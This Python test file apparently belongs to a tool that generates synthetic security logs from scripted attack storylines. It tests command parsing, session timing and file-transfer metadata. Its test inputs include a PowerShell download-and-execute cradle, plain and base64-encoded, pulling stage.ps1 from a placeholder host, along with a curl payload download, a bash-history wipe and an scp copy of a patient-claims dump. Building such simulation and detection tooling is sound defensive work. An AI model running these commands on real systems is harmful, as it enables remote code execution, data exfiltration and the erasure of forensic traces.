# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for network evidence inferred from storyline commands."""

import random
from datetime import UTC, datetime, timedelta
from types import SimpleNamespace
from typing import Any

from evidenceforge.events.contexts import FileTransferContext, HostContext
from evidenceforge.generation.actions import (
    HttpResponseFileTransferActionBundle,
    HttpResponseFileTransferRequest,
    ScpReceiverFileActionBundle,
    ScpReceiverFileRequest,
    SmbFileTransferMetadataActionBundle,
    SmbFileTransferMetadataRequest,
    StagedArchiveSmbReadActionBundle,
    StagedArchiveSmbReadRequest,
)
from evidenceforge.generation.activity import ActivityGenerator
from evidenceforge.generation.engine.storyline import (
    StorylineMixin,
    _estimate_process_lifetime,
    _linux_shell_process_command_line,
)
from evidenceforge.generation.source_timing import SourceTimingPlanner
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.scenario import ConnectionEventSpec, System, User


class TestStorylineCommandNetworks:
    def test_recorded_storyline_logon_expires_at_transport_close(self):
        """Recorded storyline SSH sessions should not be reused after TCP close."""
        state = StateManager()
        start = datetime(2024, 3, 18, 14, 15, 0, tzinfo=UTC)
        close = start + timedelta(minutes=10)
        actor = User(
            username="root",
            full_name="Root",
            email="root@example.local",
        )
        system = System(
            hostname="APP-INT-01",
            ip="10.10.2.30",
            os="Ubuntu 22.04",
            type="server",
        )
        logon_id = state.create_session(
            username=actor.username,
            system=system.hostname,
            logon_type=10,
            source_ip="10.10.3.10",
            start_time=start,
            session_kind="ssh",
        )
        state.update_session_metadata(logon_id, network_close_time=close)
        engine = object.__new__(StorylineMixin)
        engine.state_manager = state
        engine._record_storyline_logon(actor, system, logon_id, source_ip="10.10.3.10")

        assert (
            engine._last_storyline_logon_for_actor_system(
                actor,
                system,
                at_time=close - timedelta(seconds=1),
            )
            == logon_id
        )
        assert (
            engine._last_storyline_logon_for_actor_system(
                actor,
                system,
                at_time=close + timedelta(minutes=1),
            )
            is None
        )
        assert (
            engine._last_storyline_logon_source_for_actor_system(
                actor,
                system,
                at_time=close + timedelta(minutes=1),
            )
            is None
        )

    def test_next_storyline_logoff_time_finds_matching_actor_and_host(self):
        """Future logoff lookups should bind storyline SSH lifetimes to the right host."""
        actor = User(
            username="root",
            full_name="Root",
            email="root@example.local",
        )
        system = System(
            hostname="APP-INT-01",
            ip="10.10.2.30",
            os="Ubuntu 22.04",
            type="server",
        )
        engine = object.__new__(StorylineMixin)
        engine.start_time = datetime(2024, 3, 18, 12, 0, 0, tzinfo=UTC)
        engine.scenario = SimpleNamespace(
            storyline=[
                SimpleNamespace(
                    actor="root",
                    system="WEB-EXT-01",
                    time="+5h50m",
                    events=[SimpleNamespace(type="logoff")],
                ),
                SimpleNamespace(
                    actor="root",
                    system="APP-INT-01",
                    time="+5h57m",
                    events=[SimpleNamespace(type="logoff")],
                ),
            ]
        )

        assert engine._next_storyline_logoff_time_for_actor_system(
            actor,
            system,
            datetime(2024, 3, 18, 17, 41, 0, tzinfo=UTC),
        ) == datetime(2024, 3, 18, 17, 57, 0, tzinfo=UTC)

    def test_linux_shell_storyline_process_renders_explicit_shell_invocation(self):
        """Bare shell control syntax should be rendered as source-native bash -c argv."""
        command_line = _linux_shell_process_command_line(
            "/bin/bash",
            "history -c && cat /dev/null > ~/.bash_history",
        )

        assert command_line == "bash -c 'history -c && cat /dev/null > ~/.bash_history'"

    def test_extract_http_url_from_powershell_download(self):
        url = StorylineMixin._extract_http_url(
            'powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('
            "'https://cdn.example.test/stage.ps1')\""
        )

        assert url == "https://cdn.example.test/stage.ps1"

    def test_extract_http_url_from_encoded_powershell_download(self):
        url = StorylineMixin._extract_http_url(
            "powershell.exe -NoProfile -EncodedCommand "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAuAGUAeABhAG0AcABsAGUALgB0AGUAcwB0AC8AcwB0AGEAZwBlAC4AcABzADEAIgApAA=="
        )

        assert url == "https://cdn.example.test/stage.ps1"

    def test_extract_http_url_skips_oversized_encoded_command(self, monkeypatch):
        def fail_b64decode(*args: Any, **kwargs: Any) -> bytes:
            raise AssertionError("oversized EncodedCommand token should not be decoded")

        monkeypatch.setattr(
            "evidenceforge.generation.engine.storyline.base64.b64decode",
            fail_b64decode,
        )
        command = "powershell.exe -EncodedCommand " + ("A" * 20_000)

        url = StorylineMixin._extract_http_url(command)

        assert url is None

    def test_extract_http_url_skips_oversized_shell_base64_decode(self, monkeypatch):
        def fail_b64decode(*args: Any, **kwargs: Any) -> bytes:
            raise AssertionError("oversized shell base64 token should not be decoded")

        monkeypatch.setattr(
            "evidenceforge.generation.engine.storyline.base64.b64decode",
            fail_b64decode,
        )
        command = "printf '" + ("A" * 20_000) + "' | base64 -d"

        url = StorylineMixin._extract_http_url(command)

        assert url is None

    def test_parse_http_url_target_accepts_valid_url(self):
        target = StorylineMixin._parse_http_url_target("https://cdn.example.test:8443/stage.ps1")

        assert target == ("cdn.example.test", 8443)

    def test_parse_http_url_target_rejects_non_numeric_port(self):
        target = StorylineMixin._parse_http_url_target("http://example.com:bad/path")

        assert target is None

    def test_parse_http_url_target_rejects_malformed_bracketed_host(self):
        target = StorylineMixin._parse_http_url_target("http://[not-a-valid-host/path")

        assert target is None

    def test_extract_output_file_ignores_find_or_operator(self):
        output_file = StorylineMixin._extract_output_file(
            "find /var/www/html -name *.conf -o -name *.env",
            "linux",
        )

        assert output_file is None

    def test_extract_output_file_accepts_short_o_for_output_tools(self):
        output_file = StorylineMixin._extract_output_file(
            "curl -s -o /tmp/stage.ps1 https://example.test/stage.ps1",
            "linux",
        )

        assert output_file == "/tmp/stage.ps1"

    def test_extract_scp_target_from_remote_destination(self):
        target = StorylineMixin._extract_scp_target(
            "scp /tmp/patient_claims.sql.gz root@10.10.2.30:/var/tmp/",
            "linux",
        )

        assert target == "10.10.2.30"

    def test_extract_sqlcmd_target_from_dash_s_ip(self):
        target = StorylineMixin._extract_database_client_target(
            'sqlcmd.exe -S 10.0.2.50 -d hr_records -Q "SELECT name FROM sys.databases"',
            "windows",
        )

        assert target == ("10.0.2.50", 1433, "tds")

    def test_extract_sqlcmd_target_accepts_tcp_port_prefix(self):
        target = StorylineMixin._extract_database_client_target(
            'sqlcmd.exe -S "tcp:DB-PROD-01,14330" -Q "SELECT 1"',
            "windows",
        )

        assert target == ("DB-PROD-01", 14330, "tds")

    def test_linux_web_storyline_actor_uses_native_service_user(self):
        state = StateManager()
        ts = datetime(2024, 3, 18, 12, 0, 0, tzinfo=UTC)
        state.set_current_time(ts - timedelta(minutes=5))
        web_system = System(
            hostname="WEB-EXT-01",
            ip="10.10.3.10",
            os="Ubuntu 22.04",
            type="server",
            roles=["web_server"],
        )
        systemd_pid = state.create_process(
            "WEB-EXT-01",
            0,
            "/usr/lib/systemd/systemd",
            "/usr/lib/systemd/systemd",
            "root",
            "System",
        )
        apache_pid = state.create_process(
            "WEB-EXT-01",
            systemd_pid,
            "/usr/sbin/apache2",
            "/usr/sbin/apache2 -DFOREGROUND",
            "www-data",
            "System",
        )
        engine = object.__new__(StorylineMixin)
        engine.state_manager = state
        engine.activity_generator = SimpleNamespace(
            _system_pids={"WEB-EXT-01": {"apache2": apache_pid}},
        )
        actor = User(
            username="apache",
            full_name="Apache Service",
            email="apache@example.local",
        )

        native_actor = engine._linux_native_service_user_for_storyline_actor(
            actor,
            web_system,
            ts,
        )

        assert native_actor.username == "www-data"
        assert native_actor.email == "www-data@example.local"

    def test_foreground_process_defers_termination_for_following_same_host_connection(self):
        web_system = System(
            hostname="WEB-EXT-01",
            ip="10.10.3.10",
            os="Ubuntu 22.04",
            type="server",
        )

        assert StorylineMixin._process_has_following_same_host_connection(
            web_system,
            [
                SimpleNamespace(type="raw"),
                SimpleNamespace(type="connection", source_ip=""),
            ],
        )
        assert not StorylineMixin._process_has_following_same_host_connection(
            web_system,
            [
                SimpleNamespace(type="process"),
                SimpleNamespace(type="connection", source_ip=""),
            ],
        )
        assert StorylineMixin._process_has_following_same_host_connection(
            web_system,
            iter(
                [
                    SimpleNamespace(type="raw"),
                    SimpleNamespace(type="connection", source_ip=""),
                ],
            ),
        )

    def test_apache_raw_syslog_uses_canonical_vip_tuple_and_listener_pid(self):
        ts = datetime(2024, 3, 18, 13, 20, 1, tzinfo=UTC)
        state = StateManager()
        state.set_current_time(ts - timedelta(minutes=10))
        web_system = System(
            hostname="WEB-EXT-01",
            ip="10.10.3.10",
            os="Ubuntu 22.04",
            type="server",
            roles=["web_server"],
        )
        systemd_pid = state.create_process(
            "WEB-EXT-01",
            0,
            "/usr/lib/systemd/systemd",
            "/usr/lib/systemd/systemd",
            "root",
            "System",
        )
        apache_pid = state.create_process(
            "WEB-EXT-01",
            systemd_pid,
            "/usr/sbin/apache2",
            "/usr/sbin/apache2 -DFOREGROUND",
            "www-data",
            "System",
        )
        generator = object.__new__(ActivityGenerator)
        generator.state_manager = state
        generator._system_pids = {"WEB-EXT-01": {"apache2": apache_pid}}
        generator._recent_connection_tuples = {
            ("185.70.41.45", 61522, "203.0.113.10", 443, "tcp"): ts.timestamp() - 1200,
            ("185.70.41.45", 53742, "203.0.113.10", 443, "tcp"): ts.timestamp() + 26,
        }
        generator.dispatcher = SimpleNamespace(
            visibility_engine=SimpleNamespace(
                _real_ip_to_vip={"10.10.3.10": "203.0.113.10"},
            ),
        )

        fields = generator._normalize_apache_raw_syslog(
            ts,
            {
                "pid": 2418,
                "message": "[Mon Mar 18 07:20:42.128744 2024] [proxy_fcgi:error] "
                "[pid 2418] [client 185.70.41.45:53218] PHP message",
            },
            web_system,
        )

        assert fields["pid"] == apache_pid
        assert f"[pid {apache_pid}]" in fields["message"]
        assert "[client 185.70.41.45:53742]" in fields["message"]

    def test_resolve_storyline_network_target_matches_fqdn(self):
        engine = object.__new__(StorylineMixin)
        engine._ad_domain = "meridianhcs.local"
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(
                systems=[
                    System(
                        hostname="APP-INT-01",
                        ip="10.10.2.30",
                        os="Ubuntu 22.04",
                        type="server",
                    )
                ]
            )
        )

        assert engine._resolve_storyline_network_target("APP-INT-01.meridianhcs.local") == (
            "10.10.2.30"
        )

    def test_storyline_authored_ip_for_hostname_uses_explicit_dns_answer(self):
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            storyline=[
                SimpleNamespace(
                    events=[
                        SimpleNamespace(
                            type="dns_query",
                            query="cdn-assets-update.com",
                            answer="45.33.32.30",
                        )
                    ]
                )
            ]
        )

        assert engine._storyline_authored_ip_for_hostname("cdn-assets-update.com") == (
            "45.33.32.30"
        )

    def test_storyline_authored_ip_for_hostname_caches_storyline_scan(self):
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            storyline=[
                SimpleNamespace(
                    events=[
                        SimpleNamespace(type="dns_query", query="one.example", answer="192.0.2.10"),
                        SimpleNamespace(
                            type="connection", hostname="two.example", dst_ip="192.0.2.20"
                        ),
                        SimpleNamespace(
                            type="dns_query", query="three.example", answer="192.0.2.30"
                        ),
                    ]
                )
            ]
        )
        field_reads = 0

        def counting_storyline_spec_value(spec: Any, field_name: str) -> Any:
            nonlocal field_reads
            field_reads += 1
            return StorylineMixin._storyline_spec_value(spec, field_name)

        engine._storyline_spec_value = counting_storyline_spec_value

        assert engine._storyline_authored_ip_for_hostname("missing.example") is None
        assert field_reads == 12

        assert engine._storyline_authored_ip_for_hostname("still-missing.example") is None
        assert engine._storyline_authored_ip_for_hostname("two.example") == "192.0.2.20"
        assert field_reads == 12

    def test_dns_query_event_marks_explicit_ttl_preserved(self):
        engine = object.__new__(StorylineMixin)
        captured: dict[str, Any] = {}

        class FakeActivityGenerator:
            _dns_server_ips = ["10.0.0.1"]

            @staticmethod
            def generate_connection(**kwargs: Any) -> None:
                captured.update(kwargs)

        engine.activity_generator = FakeActivityGenerator()
        spec = SimpleNamespace(
            type="dns_query",
            query="cache-poison.example",
            qtype="A",
            rcode="NOERROR",
            answer="203.0.113.77",
            ttl=42,
            source_ip=None,
        )

        engine._execute_typed_event(
            spec,
            actor=SimpleNamespace(username="alice"),
            system=SimpleNamespace(hostname="WS-01", ip="10.0.1.20"),
            time=datetime(2024, 3, 18, 12, 0, tzinfo=UTC),
            activity="authored DNS TTL",
            explicit_types={"dns_query"},
        )

        assert captured["dns"].preserve_ttls is True
        assert captured["dns"].TTLs == [42.0]

    def test_activity_generator_remembers_rendered_process_create_time(self):
        class _ProcessTimingEmitter:
            render_time: datetime | None = None

            @staticmethod
            def can_handle(event: Any) -> bool:
                return event.event_type == "process_create"

            def emit(self, event: Any) -> None:
                host = event.src_host
                proc = event.process
                process_start_time = proc.start_time or event.timestamp
                self.render_time = SourceTimingPlanner().source_time(
                    event,
                    "source.ecar_process_create",
                    seed_parts=(host.hostname, proc.pid, process_start_time),
                    not_before=process_start_time,
                )

        emitter = _ProcessTimingEmitter()
        state_manager = StateManager()
        generator = ActivityGenerator(state_manager, {"ecar": emitter})
        actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
        system = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        state_manager.set_current_time(event_time)

        pid = generator.generate_process(
            actor,
            system,
            event_time,
            "0x3e7",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
            parent_pid=4,
        )

        assert emitter.render_time is not None
        assert generator.process_source_create_time(system.hostname, pid) >= emitter.render_time

    def test_activity_generator_preplans_process_create_time_before_threaded_dispatch(self):
        captured: dict[str, Any] = {}

        class _CapturingDispatcher:
            @staticmethod
            def dispatch(event: Any) -> None:
                if event.event_type == "process_create":
                    captured["event"] = event

        state_manager = StateManager()
        generator = ActivityGenerator(state_manager, {})
        generator.dispatcher = _CapturingDispatcher()
        actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
        system = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        state_manager.set_current_time(event_time)

        pid = generator.generate_process(
            actor,
            system,
            event_time,
            "0x3e7",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
            parent_pid=4,
        )

        event = captured["event"]
        assert event.source_timing is not None
        source_keys = set(event.source_timing.source_times)
        assert any(key.startswith("source.windows_security_process_create|") for key in source_keys)
        assert any(key.startswith("source.sysmon_process_create|") for key in source_keys)
        assert any(key.startswith("source.ecar_process_create|") for key in source_keys)
        sysmon_time = next(
            value
            for key, value in event.source_timing.source_times.items()
            if key.startswith("source.sysmon_process_create|")
        )
        security_time = next(
            value
            for key, value in event.source_timing.source_times.items()
            if key.startswith("source.windows_security_process_create|")
        )
        assert security_time >= sysmon_time + timedelta(milliseconds=25)
        assert generator.process_source_create_time(system.hostname, pid) == max(
            event.source_timing.source_times.values()
        )

    def test_process_owned_windows_connection_waits_for_visible_process_create(self):
        captured: list[Any] = []

        class _CapturingDispatcher:
            visibility_engine = None

            @staticmethod
            def dispatch(event: Any) -> None:
                captured.append(event)

            @staticmethod
            def record_filtered_network_observation() -> None:
                return None

        state_manager = StateManager()
        generator = ActivityGenerator(state_manager, {})
        generator.dispatcher = _CapturingDispatcher()
        actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 11 Enterprise",
            type="workstation",
        )
        target = System(
            hostname="DC-01",
            ip="10.10.0.20",
            os="Windows Server 2022",
            type="server",
        )
        generator._ip_to_system = {source.ip: source, target.ip: target}
        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        state_manager.set_current_time(event_time)

        pid = generator.generate_process(
            actor,
            source,
            event_time,
            "0x3e7",
            r"C:\Windows\System32\mstsc.exe",
            "mstsc.exe /v:DC-01",
            parent_pid=4,
        )
        visible_process_time = generator.process_source_create_time(source.hostname, pid)
        assert visible_process_time is not None

        generator.generate_connection(
            src_ip=source.ip,
            dst_ip=target.ip,
            time=event_time + timedelta(milliseconds=1),
            dst_port=3389,
            proto="tcp",
            service="rdp",
            duration=3.0,
            orig_bytes=1200,
            resp_bytes=2400,
            pid=pid,
            source_system=source,
        )

        connection = next(event for event in captured if event.event_type == "connection")
        wfp = next(event for event in captured if event.event_type == "wfp_connection")
        assert connection.timestamp > visible_process_time
        assert wfp.timestamp > visible_process_time


class _FakeActivityGenerator:
    def __init__(self) -> None:
        self.reserved_ports: list[int] = []
        self.connections: list[dict] = []
        self.ssh_sessions: list[dict] = []
        self.explicit_credentials: list[dict] = []
        self.processes: list[dict] = []
        self.process_terminations: list[dict] = []
        self.process_source_times: dict[tuple[str, int], datetime] = {}
        self.process_source_termination_times: dict[tuple[str, int], datetime] = {}
        self.ssh_ready_times: dict[tuple[str, int, str], datetime] = {}
        self.process_source_termination_offset: timedelta | None = None
        self.service_installs: list[dict] = []
        self.dhcp_leases: list[dict] = []
        self.syslog_events: list[dict] = []
        self.bash_commands: list[dict] = []
        self.account_creates: list[dict] = []
        self.password_resets: list[dict] = []
        self.account_changes: list[dict] = []
        self.group_memberships: list[dict] = []
        self.log_clears: list[dict] = []
        self.process_accesses: list[dict] = []
        self._last_connection_effective_tuple: tuple[str, int, str, int, str] | None = None
        self.remote_threads: list[dict] = []
        self.scheduled_tasks: list[dict] = []
        self.sid_registry: dict[str, str] = {}
        self.bash_schedule_offset: timedelta | None = None
        self._bash_next_time: dict[tuple[str, str], datetime] = {}
        self._foreground_next_time: dict[tuple[str, str, str, int], datetime] = {}
        self._next_pid = 4241

    def generate_bash_command(self, *args: Any, **kwargs: Any) -> datetime | None:
        actor = args[0]
        system = args[1]
        requested_time = args[2]
        scheduled_time = (
            requested_time + self.bash_schedule_offset
            if self.bash_schedule_offset is not None
            else requested_time
        )
        scheduled_time = max(
            scheduled_time,
            self._bash_next_time.get((system.hostname, actor.username), scheduled_time),
        )
        self.bash_commands.append(
            {"args": args, "kwargs": kwargs, "scheduled_time": scheduled_time}
        )
        return scheduled_time

    def reserve_linux_foreground_process_start(self, **kwargs: Any) -> datetime:
        system = kwargs["system"]
        username = kwargs["username"]
        logon_id = kwargs["logon_id"]
        parent_pid = kwargs["parent_pid"]
        requested_time = kwargs["requested_time"]
        key = (system.hostname, username, logon_id, parent_pid)
        return max(requested_time, self._foreground_next_time.get(key, requested_time))

    def remember_linux_foreground_process_completion(self, **kwargs: Any) -> None:
        system = kwargs["system"]
        username = kwargs["username"]
        logon_id = kwargs["logon_id"]
        parent_pid = kwargs["parent_pid"]
        termination_time = kwargs["termination_time"]
        foreground_key = (system.hostname, username, logon_id, parent_pid)
        release_time = termination_time + timedelta(milliseconds=250)
        self._foreground_next_time[foreground_key] = max(
            release_time,
            self._foreground_next_time.get(foreground_key, release_time),
        )
        bash_key = (system.hostname, username)
        self._bash_next_time[bash_key] = max(
            release_time,
            self._bash_next_time.get(bash_key, release_time),
        )

    def _resolve_parent(self, *args: Any, **kwargs: Any) -> int:
        return 1

    def _get_system_pid(self, *args: Any, **kwargs: Any) -> int:
        return 500

    def _build_host_context(self, system: System) -> HostContext:
        return HostContext(
            hostname=system.hostname,
            ip=system.ip,
            os=system.os,
            os_category="linux"
            if "linux" in system.os.lower() or "ubuntu" in system.os.lower()
            else "windows",
            system_type=system.type,
        )

    def generate_process(self, *args: Any, **kwargs: Any) -> int:
        self._next_pid += 1
        self.processes.append(kwargs)
        return self._next_pid

    def generate_process_termination(self, *args: Any, **kwargs: Any) -> None:
        self.process_terminations.append(kwargs)
        system = kwargs.get("system")
        pid = kwargs.get("pid")
        termination_time = kwargs.get("time")
        if (
            system is not None
            and isinstance(pid, int)
            and isinstance(termination_time, datetime)
            and self.process_source_termination_offset is not None
        ):
            self.process_source_termination_times[(system.hostname, pid)] = (
                termination_time + self.process_source_termination_offset
            )

    def generate_logon(self, *args: Any, **kwargs: Any) -> str:
        return "0xabc"

    def _record_user_process(self, *args: Any, **kwargs: Any) -> None:
        return None

    def reserve_ssh_source_port(self, *args: Any, **kwargs: Any) -> int:
        self.reserved_ports.append(45678)
        return 45678

    def generate_connection(self, **kwargs: Any) -> str:
        src_port = kwargs.get("src_port") or 50000 + len(self.connections)
        self._last_connection_effective_tuple = (
            kwargs["src_ip"],
            src_port,
            kwargs["dst_ip"],
            kwargs["dst_port"],
            kwargs.get("proto", "tcp"),
        )
        self.connections.append(kwargs)
        return "Cscptransfer00001"

    def _last_effective_connection_source_port(
        self,
        *,
        src_ip: str,
        dst_ip: str,
        dst_port: int,
        proto: str = "tcp",
    ) -> int | None:
        if self._last_connection_effective_tuple is None:
            return None
        last_src_ip, last_src_port, last_dst_ip, last_dst_port, last_proto = (
            self._last_connection_effective_tuple
        )
        if (
            last_src_ip == src_ip
            and last_dst_ip == dst_ip
            and last_dst_port == dst_port
            and last_proto == proto
        ):
            return last_src_port
        return None

    def generate_ssh_session(self, **kwargs: Any) -> str:
        self.ssh_sessions.append(kwargs)
        return "Cscptransfer00001"

    def _user_model_for_username(self, username: str) -> User:
        return User(
            username=username,
            full_name=username,
            email=f"{username}@example.local",
        )

    def process_source_create_time(self, hostname: str, pid: int) -> datetime | None:
        return self.process_source_times.get((hostname, pid))

    def process_source_terminate_time(self, hostname: str, pid: int) -> datetime | None:
        return self.process_source_termination_times.get((hostname, pid))

    def ssh_session_ready_time_for_tuple(
        self,
        source_ip: str,
        source_port: int,
        target_ip: str,
    ) -> datetime | None:
        return self.ssh_ready_times.get((source_ip, source_port, target_ip))

    def generate_explicit_credentials(self, **kwargs: Any) -> None:
        self.explicit_credentials.append(kwargs)

    def generate_service_installed(self, **kwargs: Any) -> None:
        self.service_installs.append(kwargs)

    def generate_scheduled_task(self, **kwargs: Any) -> None:
        self.scheduled_tasks.append(kwargs)

    def generate_account_created(self, **kwargs: Any) -> None:
        self.account_creates.append(kwargs)

    def generate_password_reset(self, **kwargs: Any) -> None:
        self.password_resets.append(kwargs)

    def generate_account_changed(self, **kwargs: Any) -> None:
        self.account_changes.append(kwargs)

    def generate_group_membership_change(self, **kwargs: Any) -> None:
        self.group_memberships.append(kwargs)

    def generate_log_cleared(self, **kwargs: Any) -> None:
        self.log_clears.append(kwargs)

    def generate_process_access(self, **kwargs: Any) -> bool:
        self.process_accesses.append(kwargs)
        return True

    def generate_create_remote_thread(self, **kwargs: Any) -> bool:
        self.remote_threads.append(kwargs)
        return True

    def generate_dhcp_lease(self, **kwargs: Any) -> None:
        self.dhcp_leases.append(kwargs)

    def generate_syslog_event(self, **kwargs: Any) -> None:
        self.syslog_events.append(kwargs)

    def _expand_and_emit(self, *args: Any, **kwargs: Any) -> None:
        return None


class _FakeStateManager:
    def __init__(self) -> None:
        self.sessions: dict[str, SimpleNamespace] = {}
        self.processes: dict[tuple[str, int], SimpleNamespace] = {}

    def set_current_time(self, *args: Any, **kwargs: Any) -> None:
        return None

    def get_sessions_for_user(self, username: str) -> list[SimpleNamespace]:
        if self.sessions:
            return list(self.sessions.values())
        return [
            SimpleNamespace(
                username=username,
                system="SRC",
                logon_id="0xabc",
                logon_type=2,
                source_ip="",
                start_time=datetime(2020, 1, 1, tzinfo=UTC),
                network_close_time=None,
            )
        ]

    def get_sessions_for_user_at(self, username: str, at_time: datetime) -> list[SimpleNamespace]:
        _ = at_time
        return self.get_sessions_for_user(username)

    def get_session(self, logon_id: str) -> SimpleNamespace | None:
        return self.sessions.get(logon_id)

    def get_processes_on_system(self, hostname: str) -> list[SimpleNamespace]:
        return []

    def get_process(self, hostname: str, pid: int) -> SimpleNamespace | None:
        return self.processes.get((hostname, pid))

    def create_process(self, *args: Any, **kwargs: Any) -> int:
        return 6505

    def get_process_object_id(self, hostname: str, pid: int) -> str:
        return f"{hostname}:{pid}"

    def mark_story_process(self, hostname: str, pid: int) -> None:
        return None


class TestFileTransferActionBundles:
    def test_http_file_transfer_bundle_anchor_is_stable(self):
        """Identical HTTP file-transfer requests should have stable action anchors."""
        request = HttpResponseFileTransferRequest(
            host="cdn.example.test",
            uri="/payload.bin",
            dst_ip="93.184.216.34",
            response_body_len=4096,
            response_mime_types=["application/octet-stream"],
            timestamp=datetime(2026, 5, 18, 12, 0, tzinfo=UTC),
        )

        first = HttpResponseFileTransferActionBundle(request, random.Random(1)).anchor
        second = HttpResponseFileTransferActionBundle(request, random.Random(99)).anchor

        assert first == second

    def test_http_file_transfer_bundle_builds_source_native_context(self):
        """HTTP response file transfers should carry Zeek files.log metadata."""
        request = HttpResponseFileTransferRequest(
            host="cdn.example.test",
            uri="/payload.bin",
            dst_ip="93.184.216.34",
            response_body_len=4096,
            response_mime_types=["application/octet-stream"],
            timestamp=datetime(2026, 5, 18, 12, 0, tzinfo=UTC),
        )

        result = HttpResponseFileTransferActionBundle(request, random.Random(4)).execute()

        assert result.file_transfer.source == "HTTP"
        assert result.file_transfer.fuid.startswith("F")
        assert result.file_transfer.total_bytes == 4096
        assert result.file_transfer.sha1

    def test_http_file_transfer_bundle_uses_payload_scale_duration(self):
        """Large HTTP response files should not get analyzer-jitter transfer durations."""
        request = HttpResponseFileTransferRequest(
            host="cdn.example.test",
            uri="/installer.exe",
            dst_ip="93.184.216.34",
            response_body_len=78_306_264,
            response_mime_types=["application/x-msdownload"],
            timestamp=datetime(2026, 5, 18, 12, 0, tzinfo=UTC),
            parent_duration=6.0,
        )

        result = HttpResponseFileTransferActionBundle(request, random.Random(4)).execute()

        assert result.file_transfer.duration > 1.0
        assert result.file_transfer.duration < request.parent_duration
        assert result.file_transfer.seen_bytes == request.response_body_len

    def test_http_file_transfer_hashes_follow_static_object_identity(self):
        """Identical HTTP response objects should not get new hashes per FUID."""
        request = HttpResponseFileTransferRequest(
            host="dbeaver.io",
            uri="/files/dbeaver-ce-latest-x86_64-setup.exe",
            dst_ip="93.184.216.34",
            response_body_len=78_306_264,
            response_mime_types=["application/x-msdownload"],
            timestamp=datetime(2026, 5, 18, 12, 0, tzinfo=UTC),
            parent_duration=6.0,
        )

        first = HttpResponseFileTransferActionBundle(request, random.Random(4)).execute()
        second = HttpResponseFileTransferActionBundle(request, random.Random(9)).execute()

        assert first.file_transfer.fuid != second.file_transfer.fuid
        assert first.file_transfer.sha1 == second.file_transfer.sha1

    def test_http_file_transfer_pe_metadata_follows_content_identity(self):
        """Identical HTTP response objects should not get new PE metadata per FUID."""
        request = HttpResponseFileTransferRequest(
            host="dbeaver.io",
            uri="/files/dbeaver-ce-latest-x86_64-setup.exe",
            dst_ip="93.184.216.34",
            response_body_len=78_306_264,
            response_mime_types=["application/x-msdownload"],
            timestamp=datetime(2026, 5, 18, 12, 0, tzinfo=UTC),
            parent_duration=6.0,
        )

        first = HttpResponseFileTransferActionBundle(request, random.Random(4)).execute()
        second = HttpResponseFileTransferActionBundle(request, random.Random(9)).execute()
        later_request = HttpResponseFileTransferRequest(
            host=request.host,
            uri=request.uri,
            dst_ip=request.dst_ip,
            response_body_len=request.response_body_len,
            response_mime_types=request.response_mime_types,
            timestamp=request.timestamp + timedelta(hours=2),
            parent_duration=request.parent_duration,
        )
        later = HttpResponseFileTransferActionBundle(later_request, random.Random(12)).execute()

        assert first.pe is not None
        assert second.pe is not None
        assert later.pe is not None
        assert first.pe.id == first.file_transfer.fuid
        assert second.pe.id == second.file_transfer.fuid
        assert later.pe.id == later.file_transfer.fuid
        assert first.pe.id != second.pe.id
        assert first.pe.machine == second.pe.machine == "AMD64"
        assert later.pe.machine == "AMD64"
        assert first.pe.is_64bit is True
        assert second.pe.is_64bit is True
        assert later.pe.is_64bit is True
        assert first.pe.compile_ts == second.pe.compile_ts
        assert later.pe.compile_ts == first.pe.compile_ts
        assert first.pe.section_names == second.pe.section_names
        assert later.pe.section_names == first.pe.section_names
        assert first.pe.uses_aslr == second.pe.uses_aslr
        assert later.pe.uses_aslr == first.pe.uses_aslr
        assert first.pe.has_cert_table == second.pe.has_cert_table
        assert later.pe.has_cert_table == first.pe.has_cert_table

    def test_http_file_transfer_bundle_tolerates_malformed_absolute_uri(self):
        """Malformed absolute-form URIs should fall back to raw URI identity."""
        request = HttpResponseFileTransferRequest(
            host="cdn.example.test",
            uri="http://[::1/path.exe",
            dst_ip="93.184.216.34",
            response_body_len=78_306_264,
            response_mime_types=["application/x-msdownload"],
            timestamp=datetime(2026, 5, 18, 12, 0, tzinfo=UTC),
            parent_duration=6.0,
        )

        result = HttpResponseFileTransferActionBundle(request, random.Random(4)).execute()

        assert result.file_transfer.source == "HTTP"
        assert result.file_transfer.sha1
        assert result.pe is not None

    def test_smb_file_transfer_metadata_bundle_preserves_direction(self):
        """SMB files.log metadata should preserve caller-owned transfer direction."""
        request = SmbFileTransferMetadataRequest(
            src_ip="10.10.1.35",
            dst_ip="10.10.2.20",
            transfer_bytes=65_536,
            duration=4.2,
            server="FILE-SRV-01",
            user="aisha.johnson",
            is_orig=True,
        )
        smb_config = {
            "min_transfer_bytes": 1024,
            "mime_types": [{"mime_type": "application/pdf", "weight": 1}],
            "analyzer_sets": [{"analyzers": ["MD5"], "weight": 1}],
            "filename_templates": [
                {
                    "mime_types": ["application/pdf"],
                    "templates": [r"\\{server}\Projects\{basename}.pdf"],
                    "weight": 1,
                }
            ],
            "missing_bytes_probability": 0.0,
            "timeout_probability": 0.0,
        }

